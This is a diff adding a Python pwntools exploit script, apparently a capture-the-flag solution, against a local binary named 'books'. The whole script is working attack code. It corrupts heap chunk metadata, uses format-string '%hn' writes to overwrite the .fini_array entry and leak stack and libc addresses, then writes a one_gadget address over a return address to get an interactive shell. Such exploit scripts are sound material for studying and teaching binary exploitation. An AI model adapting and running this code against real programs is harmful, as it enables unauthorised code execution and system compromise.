@@ -1,0 +1,108 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+bini = ELF("./books")
+s = process("./books")
+
+
+def edit(n, msg):
+    s.sendline(str(n))
+    s.recvuntil("order:\n")
+    s.sendline(msg)
+    print "[edit]", n
+
+def delete(n):
+    s.sendline(str(n + 2))
+    print "[del]", n
+
+def submit():
+    s.sendline("5")
+    print "[submit]"
+
+fini_addr = 0x6011b8
+main_addr = 0x400a39  # old : 0x400830
+free_got = 0x6013b8
+
+#phase 1
+
+delete(2)
+msg = "\x00" * 0x80 + "\x00" * 8 + "\x51\x01"
+edit(1, msg)
+msg = "A" * 48 + "%2613u" + "%13$hn" + "%28$lx" + " " + "%2$lx"
+#msg = "%lx "*30
+edit(1, msg)
+s.recv()
+s.sendline("5" + "AAAAAAA" + p64(fini_addr))
+
+s.recvuntil("Order 2:")
+s.recvuntil("Order 2:")
+recved = s.recvuntil("Order 2:").split(" ")
+
+stack_addr = int(recved[-3][1:], 16)
+libc_addr = int(recved[-2].split("\n")[0], 16)
+
+libcbase = libc_addr - 0x60d20 - 0x365a60
+next_ret = stack_addr - 0x1e8
+print "next_ret" , hex(next_ret)
+print "libcbase" , hex(libcbase)
+# 13$ : fini_addr
+# 14$ : free_got
+# 28$ : stack_addr
+# 1$ : libc
+
+print s.recv()
+raw_input(":")
+
+#phase 2
+
+delete(2)
+msg = "\x00" * 0x80 + "\x00" * 8 + "\x51\x01"
+edit(1, msg)
+
+target_addr = 0xabcdef123456789a
+
+target_addr = libcbase + 0x45216 # one_gadget
+
+n_read = 65 - 0x21 + 5 + 0x14
+
+word1 = (target_addr & 0xffff) - n_read
+n_read += word1
+
+word2 = ((target_addr >> 16) & 0xffff) + 0x10000 -  ((target_addr >> 0) & 0xffff) - 5
+if word2 > 0x10000: 
+    word2 -= 0x10000
+
+n_read += word1
+word3 = ((target_addr >> 32) & 0xffff) + 0x10000 - ((target_addr >> 16) & 0xffff) - 5
+if word3 > 0x10000: 
+    word3 -= 0x10000
+n_read += word1
+
+word4 = ((target_addr >> 48) & 0xffff) + 0x10000 - ((target_addr >> 32) & 0xffff) - 5
+if word4 > 0x10000:
+    word4 -= 0x10000
+
+print "word1: ", word1
+print "word2: ", word2
+print "word3: ", word3
+print "word4: ", word4
+
+w1 = str(word1)
+w2 = str(word2)
+w3 = str(word3)
+w4 = str(word4)
+
+msg = "A" * 48 + \
+      "%" + w1 + "u" + "A" * (10 - len(w1)) + "%13$hn" + \
+      "%" + w2 + "u" + "A" * (10 - len(w2)) + "%14$hn" + \
+      "%" + w3 + "u" + "A" * (10 - len(w3)) + "%15$hn" + \
+      "%" + w4 + "u" + "A" * (10 - len(w4)) + "%16$hn"
+edit(1, msg)
+s.recv()
+s.sendline("5AAAAAAA" + p64(next_ret) + p64(next_ret + 2) + \
+            p64(next_ret + 4) + p64(next_ret + 6))
+
+s.recv()
+s.interactive()
